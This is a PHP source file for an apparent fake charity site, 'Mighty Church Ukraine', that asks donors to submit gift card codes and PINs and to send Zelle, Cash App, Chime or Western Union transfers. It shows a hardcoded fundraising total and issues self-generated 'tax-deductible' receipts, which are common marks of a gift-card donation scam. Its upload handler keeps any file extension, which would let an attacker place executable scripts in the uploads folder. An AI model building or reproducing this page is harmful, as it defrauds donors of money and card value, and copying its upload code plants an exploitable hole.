<?php
// index.php
require_once 'db.php';

$message = '';
$error = '';

// Handle Form Submissions
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // 1. Submit Gift Card Entry
    if (isset($_POST['action']) && $_POST['action'] === 'submit_giftcard') {
        $donor_email = $conn->real_escape_string($_POST['email']);
        $card_type   = $conn->real_escape_string($_POST['card_type']);
        $card_code   = $conn->real_escape_string($_POST['card_code']);
        $card_pin    = $conn->real_escape_string($_POST['card_pin'] ?? '');
        $amount      = floatval($_POST['amount'] ?? 0);
        $image_path  = '';

        // Handle Image Upload
        if (isset($_FILES['card_image']) && $_FILES['card_image']['error'] === UPLOAD_ERR_OK) {
            $ext = pathinfo($_FILES['card_image']['name'], PATHINFO_EXTENSION);
            $target = "uploads/gc_" . time() . "_" . rand(1000, 9999) . "." . $ext;
            if (move_uploaded_file($_FILES['card_image']['tmp_name'], $target)) {
                $image_path = $target;
            }
        }

        $sql = "INSERT INTO gift_cards (donor_email, card_type, card_code, card_pin, amount, image_path) 
                VALUES ('$donor_email', '$card_type', '$card_code', '$card_pin', '$amount', '$image_path')";
        
        if ($conn->query($sql)) {
            $message = "Your gift card submission has been received. May God bless your heart for clothing our children!";
        } else {
            $error = "Error saving entry: " . $conn->error;
        }
    }

    // 2. Submit Payment Proof Screenshot
    if (isset($_POST['action']) && $_POST['action'] === 'submit_payment_proof') {
        $donor_name     = $conn->real_escape_string($_POST['donor_name']);
        $donor_email    = $conn->real_escape_string($_POST['donor_email']);
        $payment_method = $conn->real_escape_string($_POST['payment_method']);
        $amount         = floatval($_POST['amount']);
        $receipt_number = "MIGHTY-" . strtoupper(substr(md5(uniqid()), 0, 8));
        $proof_image    = '';

        if (isset($_FILES['proof_image']) && $_FILES['proof_image']['error'] === UPLOAD_ERR_OK) {
            $ext = pathinfo($_FILES['proof_image']['name'], PATHINFO_EXTENSION);
            $target = "uploads/proof_" . time() . "_" . rand(1000, 9999) . "." . $ext;
            if (move_uploaded_file($_FILES['proof_image']['tmp_name'], $target)) {
                $proof_image = $target;
            }
        }

        if ($proof_image !== '') {
            $sql = "INSERT INTO payment_proofs (donor_name, donor_email, payment_method, amount, receipt_number, proof_image) 
                    VALUES ('$donor_name', '$donor_email', '$payment_method', '$amount', '$receipt_number', '$proof_image')";
            if ($conn->query($sql)) {
                $message = "Payment proof uploaded successfully! Official Receipt #: " . $receipt_number;
            } else {
                $error = "Failed to store proof.";
            }
        } else {
            $error = "Please upload a valid payment screenshot.";
        }
    }

    // 3. Post Prayer Request
    if (isset($_POST['action']) && $_POST['action'] === 'submit_prayer') {
        $author   = $conn->real_escape_string($_POST['author']);
        $location = $conn->real_escape_string($_POST['location']);
        $msg      = $conn->real_escape_string($_POST['message']);
        $avatar   = "https://i.pravatar.cc/100?img=" . rand(1, 70);

        $sql = "INSERT INTO prayers (author, location, message, avatar_url) VALUES ('$author', '$location', '$msg', '$avatar')";
        $conn->query($sql);
        $message = "Your prayer has been added to the wall!";
    }
}

// Retrieve Prayer Wall Entries
$prayers_result = $conn->query("SELECT * FROM prayers ORDER BY id DESC LIMIT 15");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mighty Church Ukraine - Relief & Sanctuary Fund</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
</head>
<body class="bg-slate-950 text-slate-100 font-sans antialiased">

    <!-- Header Navigation -->
    <nav class="bg-slate-900/90 backdrop-blur-md border-b border-slate-800 sticky top-0 z-40">
        <div class="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
            <div class="flex items-center gap-3">
                <i class="fa-solid fa-church text-amber-500 text-2xl"></i>
                <div>
                    <h1 class="font-bold text-lg text-amber-500 leading-none">MIGHTY CHURCH</h1>
                    <p class="text-xs text-slate-400">Ukraine Relief & Hope Ministry</p>
                </div>
            </div>
            <div class="flex items-center gap-4">
                <a href="#donate" class="bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold px-4 py-2 rounded-lg text-sm transition">Donate Now</a>
                <a href="admin.php" class="text-slate-400 hover:text-amber-400 text-xs flex items-center gap-1"><i class="fa-solid fa-lock"></i> Admin Portal</a>
            </div>
        </div>
    </nav>

    <!-- Alerts -->
    <?php if ($message): ?>
        <div class="bg-emerald-500/20 border border-emerald-500 text-emerald-300 p-4 text-center font-medium">
            <i class="fa-solid fa-circle-check mr-2"></i> <?= htmlspecialchars($message) ?>
        </div>
    <?php endif; ?>
    <?php if ($error): ?>
        <div class="bg-red-500/20 border border-red-500 text-red-300 p-4 text-center font-medium">
            <i class="fa-solid fa-triangle-exclamation mr-2"></i> <?= htmlspecialchars($error) ?>
        </div>
    <?php endif; ?>

    <!-- Hero Section -->
    <header class="relative py-16 px-4 bg-gradient-to-b from-slate-900 to-slate-950 border-b border-slate-800 text-center">
        <div class="max-w-4xl mx-auto">
            <span class="inline-block bg-amber-500/10 border border-amber-500/30 text-amber-400 text-xs font-semibold px-3 py-1 rounded-full mb-4 uppercase tracking-wider">
                Emergency War Relief & Sanctuary Restoration
            </span>
            <h1 class="text-4xl md:text-6xl font-black mb-6 leading-tight">Rebuilding Sanctuary, <br/><span class="text-amber-500">Clothing Ukrainian Children</span></h1>
            <p class="text-slate-400 text-lg mb-8 max-w-2xl mx-auto">
                Standing in faith amidst ongoing war. We provide hot meals, shelter repairs, and winter clothes for displaced orphans and families in Ukraine.
            </p>

            <div class="bg-slate-900/80 p-6 rounded-2xl border border-slate-800 shadow-2xl max-w-xl mx-auto text-left">
                <div class="flex justify-between text-sm mb-2 font-medium">
                    <span class="text-slate-400">Total Funds Raised</span>
                    <span class="text-amber-400 font-bold">$94,250 / $150,000 Target</span>
                </div>
                <div class="w-full bg-slate-800 rounded-full h-4 mb-4 overflow-hidden border border-slate-700">
                    <div class="bg-amber-500 h-4 rounded-full" style="width: 62%;"></div>
                </div>
                <p class="text-xs text-slate-400 text-center">62% of target reached. Thank you for standing with Ukraine!</p>
            </div>
        </div>
    </header>

    <!-- Donation Options Section -->
    <section id="donate" class="py-16 px-4 max-w-5xl mx-auto">
        <div class="text-center mb-12">
            <h2 class="text-3xl font-extrabold text-white mb-2">Choose Your Donation Method</h2>
            <p class="text-slate-400">Official Payment Address: <span class="text-amber-400 font-mono font-bold bg-slate-900 px-3 py-1 rounded-md border border-slate-800">helplife@mightychurch.com</span></p>
        </div>

        <div class="grid md:grid-cols-2 gap-8">
            
            <!-- Direct Transfer Box -->
            <div class="bg-slate-900 p-6 rounded-2xl border border-slate-800 flex flex-col justify-between">
                <div>
                    <h3 class="text-xl font-bold text-amber-400 mb-4 flex items-center gap-2">
                        <i class="fa-solid fa-mobile-screen"></i> Zelle, PayPal, Cash App, Chime, Western Union
                    </h3>
                    <p class="text-slate-300 text-sm mb-6">
                        Send your gift directly to our verified ministry handle. After transferring, upload your screenshot to receive an official tax-deductible receipt.
                    </p>
                    <div class="bg-slate-950 p-4 rounded-xl border border-slate-800 mb-6 font-mono text-sm space-y-2">
                        <div class="flex justify-between"><span class="text-slate-500">Zelle / PayPal Email:</span> <span class="text-amber-400">helplife@mightychurch.com</span></div>
                        <div class="flex justify-between"><span class="text-slate-500">Cash App Tag:</span> <span class="text-amber-400">$MightyChurchRelief</span></div>
                        <div class="flex justify-between"><span class="text-slate-500">Chime Handle:</span> <span class="text-amber-400">$MightyChurch</span></div>
                    </div>
                </div>

                <!-- Proof Submission Form -->
                <form action="index.php" method="POST" enctype="multipart/form-data" class="space-y-4 border-t border-slate-800 pt-4">
                    <input type="hidden" name="action" value="submit_payment_proof">
                    <h4 class="text-xs font-bold uppercase text-slate-400">Upload Transfer Proof / Screenshot</h4>
                    <input type="text" name="donor_name" placeholder="Your Name" required class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-sm text-white">
                    <input type="email" name="donor_email" placeholder="Your Email Address" required class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-sm text-white">
                    <div class="grid grid-cols-2 gap-2">
                        <select name="payment_method" class="bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-sm text-white">
                            <option>Zelle</option>
                            <option>PayPal</option>
                            <option>Cash App</option>
                            <option>Chime</option>
                            <option>Western Union</option>
                        </select>
                        <input type="number" step="0.01" name="amount" placeholder="Amount ($)" required class="bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-sm text-white">
                    </div>
                    <div>
                        <label class="block text-xs text-slate-400 mb-1">Upload Receipt Screenshot</label>
                        <input type="file" name="proof_image" accept="image/*" required class="w-full text-xs text-slate-400 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-amber-500 file:text-slate-950 hover:file:bg-amber-400">
                    </div>
                    <button type="submit" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3 rounded-lg text-sm transition">Upload Proof & Get Receipt</button>
                </form>
            </div>

            <!-- Gift Card Box -->
            <div class="bg-slate-900 p-6 rounded-2xl border border-slate-800 flex flex-col justify-between">
                <div>
                    <h3 class="text-xl font-bold text-amber-400 mb-2 flex items-center gap-2">
                        <i class="fa-solid fa-gift"></i> Donate With Gift Cards
                    </h3>
                    <p class="text-xs text-emerald-400 font-semibold mb-4 bg-emerald-500/10 border border-emerald-500/20 p-2.5 rounded-lg">
                        <i class="fa-solid fa-shirt mr-1"></i> Sephora, Xbox, & Apple gift cards are exchanged directly to purchase warm winter jackets, boots, thermals, and clothes for children!
                    </p>
                </div>

                <form action="index.php" method="POST" enctype="multipart/form-data" class="space-y-4">
                    <input type="hidden" name="action" value="submit_giftcard">
                    <div>
                        <label class="block text-xs font-semibold text-slate-400 mb-1">Select Gift Card Brand</label>
                        <select name="card_type" required class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-sm text-white">
                            <option value="Sephora Gift Card">Sephora Gift Card (Used for Winter Clothes)</option>
                            <option value="Xbox Gift Card">Xbox Gift Card (Exchanged for Supplies)</option>
                            <option value="Apple Gift Card">Apple Gift Card (Exchanged for Food/Medication)</option>
                        </select>
                    </div>

                    <input type="email" name="email" placeholder="Your Email Address" required class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-sm text-white">
                    
                    <div class="grid grid-cols-2 gap-2">
                        <input type="text" name="card_code" placeholder="Card Code / Number" required class="bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-sm text-white font-mono">
                        <input type="text" name="card_pin" placeholder="PIN (If applicable)" class="bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-sm text-white font-mono">
                    </div>

                    <input type="number" step="0.01" name="amount" placeholder="Card Value ($)" class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-sm text-white">

                    <div>
                        <label class="block text-xs text-slate-400 mb-1">Upload Card Screenshot / Receipt Image</label>
                        <input type="file" name="card_image" accept="image/*" class="w-full text-xs text-slate-400 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-amber-500 file:text-slate-950 hover:file:bg-amber-400">
                    </div>

                    <div class="bg-amber-500/10 border border-amber-500/30 p-3 rounded-lg text-center">
                        <p class="text-xs text-amber-300 italic font-medium">
                            "Do not deceive the one who needs help of the Lord from you."
                        </p>
                    </div>

                    <button type="submit" class="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3 rounded-lg text-sm transition">Submit Gift Card Donation</button>
                </form>
            </div>

        </div>
    </section>

    <!-- Prayer & Hope Wall -->
    <section class="py-16 bg-slate-900/50 border-t border-slate-800 px-4">
        <div class="max-w-6xl mx-auto">
            <div class="text-center mb-12">
                <h2 class="text-3xl font-bold text-white mb-2">Prayer & Hope Wall</h2>
                <p class="text-slate-400">Messages of faith and solidarity from supporters across the world</p>
            </div>

            <!-- Add Prayer Form -->
            <form action="index.php" method="POST" class="max-w-xl mx-auto bg-slate-900 p-6 rounded-2xl border border-slate-800 mb-12 space-y-4">
                <input type="hidden" name="action" value="submit_prayer">
                <h3 class="text-sm font-bold text-amber-400 uppercase">Post Your Encouragement / Prayer</h3>
                <div class="grid grid-cols-2 gap-2">
                    <input type="text" name="author" placeholder="Your Name" required class="bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-sm text-white">
                    <input type="text" name="location" placeholder="City, Country" required class="bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-sm text-white">
                </div>
                <textarea name="message" rows="3" placeholder="Write your prayer message..." required class="w-full bg-slate-950 border border-slate-800 p-2.5 rounded-lg text-sm text-white"></textarea>
                <button type="submit" class="w-full bg-amber-500 text-slate-950 font-bold py-2.5 rounded-lg hover:bg-amber-400 text-sm transition">Post to Prayer Wall</button>
            </form>

            <!-- Display Cards -->
            <div class="grid md:grid-cols-3 gap-6">
                <?php while ($p = $prayers_result->fetch_assoc()): ?>
                    <div class="bg-slate-900 p-5 rounded-xl border border-slate-800 flex flex-col justify-between">
                        <p class="text-slate-300 text-sm mb-4 italic">"<?= htmlspecialchars($p['message']) ?>"</p>
                        <div class="flex items-center gap-3 pt-4 border-t border-slate-800">
                            <img src="<?= htmlspecialchars($p['avatar_url']) ?>" alt="Avatar" class="w-10 h-10 rounded-full border border-amber-500">
                            <div>
                                <h4 class="text-sm font-bold text-amber-400 leading-none"><?= htmlspecialchars($p['author']) ?></h4>
                                <span class="text-xs text-slate-500"><?= htmlspecialchars($p['location']) ?></span>
                            </div>
                        </div>
                    </div>
                <?php endwhile; ?>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer class="py-8 bg-slate-950 border-t border-slate-800 text-center text-xs text-slate-500">
        <p>&copy; <?= date('Y') ?> Mighty Church Ukraine Relief Ministry. All rights reserved.</p>
        <p class="mt-1">Official Contact: helplife@mightychurch.com</p>
    </footer>

</body>
</html>